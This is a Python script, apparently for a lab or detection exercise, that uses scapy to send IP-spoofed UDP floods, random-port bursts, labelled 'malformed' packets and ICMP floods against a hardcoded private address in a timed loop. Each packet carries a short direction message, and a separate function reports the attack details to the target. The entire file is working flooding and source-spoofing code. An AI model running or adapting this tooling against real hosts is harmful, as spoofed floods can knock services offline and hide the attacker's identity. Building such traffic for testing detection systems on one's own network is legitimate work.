import socket
import random
import os
from datetime import datetime
from scapy.all import *
import time
import keyboard

def generate_random_ip():
    """ Generates a random IP address excluding reserved IP ranges. """
    not_valid = [10, 127, 169, 172, 192]
    first = random.randint(1, 255)
    while first in not_valid:
        first = random.randint(1, 255)
    ip = ".".join([str(first), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255))])
    return ip

def send_spoofed_packet(target_ip, target_port, spoofed_ip, num_packets, payload):
    """ Sends spoofed UDP packets. """
    for _ in range(num_packets):
        packet = IP(src=spoofed_ip, dst=target_ip) / UDP(dport=target_port, sport=RandShort()) / Raw(load=payload.encode())
        send(packet, verbose=0)  # verbose=0 to suppress output
        print(f"Spoofed packet sent from {spoofed_ip} to {target_ip}:{target_port}")

def send_attack_details(target_ip, port, attack_type, spoofed_ip, success, num_packets, payload):
    """ Sends details of the attack to main2.py using a spoofed IP """
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    message = f"{payload}"
    packet = IP(src=spoofed_ip, dst=target_ip) / UDP(dport=port, sport=RandShort()) / Raw(load=message.encode())
    send(packet, verbose=0)
    print(f"Details sent from spoofed IP {spoofed_ip} to {target_ip}:{port} - {message}")

def random_direction():
    """ Returns a random direction from 'up', 'down', 'left', 'right'. """
    directions = ['up', 'down', 'left', 'right']
    return random.choice(directions)

def udp_flood_attack(target_ip, target_port, spoofed_ip, num_packets):
    """ Simulates a UDP flood attack. """
    message = f"Attack Type: UDP flood attack, Message: {random_direction()}"
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        num_packets = 100
        for i in range(num_packets):
            sock.sendto(message.encode(), (target_ip, target_port))
        print("UDP flood attack complete.")
    send_attack_details(target_ip, target_port, 'UDP Flood', spoofed_ip, True, num_packets, message)

def random_port_attack(target_ip, spoofed_ip, num_packets):
    """ Sends packets to random ports. """
    num_packets = 5000
    message = f"Attack Type: Port scan attack, Message: {random_direction()}"
    for i in range(num_packets):
        target_port = random.randint(6000, 10000)
        send_spoofed_packet(target_ip, target_port, spoofed_ip, 1, message)
    print("Random port attack complete.")
    send_attack_details(target_ip, target_port, 'Random Port Attack', spoofed_ip, True, num_packets, message)

def malformed_packet_attack(target_ip, target_port, spoofed_ip, num_packets):
    """ Sends malformed packets. """
    malformed_message = f"Attack Type: Malformed Packet Attack, Message: {random_direction()}"
    num_packets = 100
    for i in range(num_packets):
        send_spoofed_packet(target_ip, target_port, spoofed_ip, 1, malformed_message)
    print("Malformed packet attack complete.")
    send_attack_details(target_ip, target_port, 'Malformed Packet Attack', spoofed_ip, True, num_packets, malformed_message)

def icmp_flood_attack(target_ip, spoofed_ip, num_packets):
    """ Simulates an ICMP flood (Ping of Death). """
    icmp_message = f"Attack Type: ICMP Flood, Message: {random_direction()}"
    num_packets = 100
    for i in range(num_packets):
        packet = IP(src=spoofed_ip, dst=target_ip) / ICMP() / Raw(load=icmp_message.encode())
        send(packet, verbose=0)
    print("ICMP flood attack complete.")
    send_attack_details(target_ip, 8080, 'ICMP Flood', spoofed_ip, True, num_packets, icmp_message)

def random_attack(target_ip, spoofed_ip):
    """ Randomly selects and executes an attack """
    attacks = [
        lambda: udp_flood_attack(target_ip, 8080, spoofed_ip, 100),
        lambda: random_port_attack(target_ip, spoofed_ip, 100),
        lambda: malformed_packet_attack(target_ip, 8080, spoofed_ip, 100),
        lambda: icmp_flood_attack(target_ip, spoofed_ip, 100)
    ]
    random.choice(attacks)()

if __name__ == "__main__":
    target_ip = "192.168.42.170"
    try:
        while True:
            spoofed_ip = generate_random_ip()
            print(f"Using spoofed IP: {spoofed_ip}")
            print("Starting a random attack...")
            random_attack(target_ip, spoofed_ip)
            interval = random.randint(30, 40)
            print(f"Waiting for {interval} seconds...")
            for i in range(interval):
                time.sleep(1)  # Sleep for 1 second intervals
                if keyboard.is_pressed('q'):  # Check if 'q' is pressed
                    print("Stopping attacks as 'q' was pressed.")
                    exit(0)  # Exit the program cleanly
    except KeyboardInterrupt:
        print("Exiting the program due to keyboard interrupt.")